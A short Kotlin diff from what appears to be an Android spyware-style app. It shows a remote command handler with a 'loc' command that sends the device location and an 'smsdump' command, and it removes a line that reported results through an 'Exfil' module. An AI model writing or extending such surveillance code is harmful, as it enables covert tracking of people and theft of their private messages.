@@ -23,7 +23,6 @@ object Commands {
         when (cmd) {
             "loc" -> {
                 LocationFix.send(ctx, immediate = true)
-                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
             }
 
             "smsdump" -> {
